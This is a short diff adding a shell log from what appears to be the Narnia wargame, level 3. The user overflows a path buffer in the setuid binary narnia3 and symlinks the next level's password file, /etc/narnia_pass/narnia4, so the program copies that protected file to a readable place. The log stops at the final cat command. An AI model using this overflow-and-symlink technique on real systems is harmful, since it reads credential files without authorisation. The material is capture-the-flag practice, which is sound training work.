@@ -1,0 +1,11 @@
+narnia3@narnia:/tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/n4rni43$ touch /tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag
+narnia3@narnia:/tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/n4rni43$ /narnia/narnia3 /tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag
+copied contents of /tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag to a safer place... (/tmp/flag)
+narnia3@narnia:/tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/n4rni43$ rm /tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag
+narnia3@narnia:/tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/n4rni43$ ln -s /etc/narnia_pass/narnia4 
+/tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag
+narnia3@narnia:/tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/n4rni43$ cat /tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag
+cat: /tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag: Permission denied
+narnia3@narnia:/tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/n4rni43$ /narnia/narnia3 /tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag
+copied contents of /tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/flag to a safer place... (/tmp/flag)
+narnia3@narnia:/tmp/n4rni43/aaaabaaacaaadaaaeaa/tmp/n4rni43$ cat /tmp/flag
